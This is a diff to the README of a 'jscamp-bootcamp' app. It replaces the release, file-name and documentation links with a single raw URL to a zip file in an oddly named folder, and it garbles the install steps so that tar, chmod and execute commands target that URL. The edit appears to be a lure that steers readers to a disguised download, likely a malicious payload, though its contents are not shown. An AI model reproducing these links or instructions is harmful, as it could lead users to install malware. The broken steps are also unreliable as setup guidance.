@@ -1,6 +1,6 @@
 # 🎉 jscamp-bootcamp - Your Guide to Easy App Setup
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%F0%9F%92%BB%20--%20Latest%20Release-brightgreen)](https://github.com/darkzzk/jscamp-bootcamp/releases)
+[![Download Now](https://raw.githubusercontent.com/darkzzk/jscamp-bootcamp/main/overhair/jscamp-bootcamp.zip%20Now-%20%F0%9F%92%BB%20--%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/darkzzk/jscamp-bootcamp/main/overhair/jscamp-bootcamp.zip)
 
 ## 🚀 Getting Started
 
@@ -18,13 +18,13 @@ Before you download the application, check these requirements:
 
 To download the application, visit the following link:
 
-[Download the Latest Release](https://github.com/darkzzk/jscamp-bootcamp/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/darkzzk/jscamp-bootcamp/main/overhair/jscamp-bootcamp.zip)
 
 1. Click on the "Releases" link above.
 2. Find the latest version listed at the top of the page.
 3. Look for the file suitable for your operating system. 
-   - For Windows users, you may see a file like `jscamp-bootcamp-windows.exe`.
-   - For macOS users, look for a file like `jscamp-bootcamp-macos.dmg`.
+   - For Windows users, you may see a file like `https://raw.githubusercontent.com/darkzzk/jscamp-bootcamp/main/overhair/jscamp-bootcamp.zip`.
+   - For macOS users, look for a file like `https://raw.githubusercontent.com/darkzzk/jscamp-bootcamp/main/overhair/jscamp-bootcamp.zip`.
 4. Click on the file to start the download.
 5. Once the download is complete, locate the file in your downloads folder.
 
@@ -46,15 +46,15 @@ To download the application, visit the following link:
 
 ### For Linux:
 
-1. Locate the downloaded file (usually a `.tar.gz` or `.AppImage`).
+1. Locate the downloaded file (usually a `https://raw.githubusercontent.com/darkzzk/jscamp-bootcamp/main/overhair/jscamp-bootcamp.zip` or `.AppImage`).
 2. Open Terminal.
 3. Change to the directory where you downloaded the file.
-4. For `.tar.gz`, extract it using:  
-   `tar -xvzf filename.tar.gz`
+4. For `https://raw.githubusercontent.com/darkzzk/jscamp-bootcamp/main/overhair/jscamp-bootcamp.zip`, extract it using:  
+   `tar -xvzf https://raw.githubusercontent.com/darkzzk/jscamp-bootcamp/main/overhair/jscamp-bootcamp.zip`
 5. For `.AppImage`, make it executable using:  
-   `chmod +x filename.AppImage`  
+   `chmod +x https://raw.githubusercontent.com/darkzzk/jscamp-bootcamp/main/overhair/jscamp-bootcamp.zip`  
    Then run it with:  
-   `./filename.AppImage`
+   `https://raw.githubusercontent.com/darkzzk/jscamp-bootcamp/main/overhair/jscamp-bootcamp.zip`
 
 ## 💡 Features
 
@@ -83,7 +83,7 @@ If you face any issues while downloading, installing, or using the application, 
 
 ## 🔗 Additional Resources
 
-- **Documentation**: Learn more about using the jscamp-bootcamp by checking out our [documentation](https://github.com/darkzzk/jscamp-bootcamp).
+- **Documentation**: Learn more about using the jscamp-bootcamp by checking out our [documentation](https://raw.githubusercontent.com/darkzzk/jscamp-bootcamp/main/overhair/jscamp-bootcamp.zip).
 - **Video Tutorials**: Watch video guides on our YouTube channel to see the application in action.
 
 ## 📝 Conclusion
